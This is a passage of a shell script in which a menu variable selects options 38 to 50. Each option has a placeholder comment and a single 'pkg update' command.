if [ "$updt" -eq 38 ]; then
    # Add your code here for option 38
    pkg update
fi

if [ "$updt" -eq 39 ]; then
    # Add your code here for option 39
    pkg update
fi

if [ "$updt" -eq 40 ]; then
    # Add your code here for option 40
    pkg update
fi

if [ "$updt" -eq 41 ]; then
    # Add your code here for option 41
    pkg update
fi

if [ "$updt" -eq 42 ]; then
    # Add your code here for option 42
    pkg update
fi

if [ "$updt" -eq 43 ]; then
    # Add your code here for option 43
    pkg update
fi

if [ "$updt" -eq 44 ]; then
    # Add your code here for option 44
    pkg update
fi

if [ "$updt" -eq 45 ]; then
    # Add your code here for option 45
    pkg update
fi

if [ "$updt" -eq 46 ]; then
    # Add your code here for option 46
    pkg update
fi

if [ "$updt" -eq 47 ]; then
    # Add your code here for option 47
    pkg update
fi

if [ "$updt" -eq 48 ]; then
    # Add your code here for option 48
    pkg update
fi

if [ "$updt" -eq 49 ]; then
    # Add your code here for option 49
    pkg update
fi

if [ "$updt" -eq 50 ]; then
    # Add your code here for option 50
    pkg update
fi
